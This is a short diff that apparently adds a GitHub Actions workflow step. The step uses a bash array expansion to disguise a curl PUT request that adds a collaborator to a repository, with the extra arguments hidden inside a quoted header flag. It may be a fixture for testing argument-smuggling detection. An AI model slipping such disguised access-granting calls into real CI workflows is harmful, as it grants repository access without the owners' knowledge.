@@ -1,0 +1,6 @@
+jobs:
+  decide:
+    steps:
+      - run: |
+          flags=(x -X PUT https://api.github.com/repos/o/r/collaborators/u)
+          curl -H "${flags[@]}"
